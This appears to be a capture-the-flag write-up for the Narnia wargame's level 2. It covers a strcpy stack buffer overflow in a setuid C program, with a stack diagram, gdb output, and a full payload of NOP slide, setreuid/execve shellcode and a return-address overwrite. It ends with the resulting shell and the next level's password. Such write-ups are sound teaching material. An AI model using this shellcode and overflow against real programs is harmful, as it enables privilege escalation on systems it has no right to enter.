login as `narnia2:5agRAXeBdG`

```sh
narnia2@gibson:/narnia$ cat narnia2.c
```

```cpp
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

strcpy -> unbounded write -> overflow `buf`

stack frame looks like this
stack grows down, so the memory is like this
```
|   |   |   |   |   |  buf  |   |   |   |     last ebp      |     last eip      |
|                                       |                   |                   |
|                 128 bytes             |      4 bytes      |      4 bytes      |
|                                       |                   |                   |
lower                                   ->                                 higher
```

write 132 (128 + 4) bytes to `buf`, then an address we have control over content (overwriting eip) and then we're good

since we have control over buf, we can use the address of buf here

```
(gdb) break *0x80491b4
Breakpoint 1 at 0x80491b4
(gdb) print $sp
$1 = (void *) 0xffffd298
```
stack pointer is at 0xffffd298, so we craft a nop slide and then append shellcode to buf

```
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
# nop slide
\xbb\xb4\x37\x01\x01\x81\xeb\x01\x01\x01\x01\xb9\xb4\x37\x01\x01\x81\xe9\x01\x01\x01\x01\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
# shellcode
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
# padding
\xb0\xd2\xff\xff
# overwrite return address; jump to 0xffffd2b0
```

```sh
narnia2@gibson:/narnia$ ./narnia2 `echo -e '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb4\x37\x01\x01\x81\xeb\x01\x01\x01\x01\xb9\xb4\x37\x01\x01\x81\xe9\x01\x01\x01\x01\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xb0\xd2\xff\xff'`
$ id
uid=14003(narnia3) gid=14002(narnia2) groups=14002(narnia2)
$ cat /etc/narnia_pass/narnia3
2xszzNl6uG
```
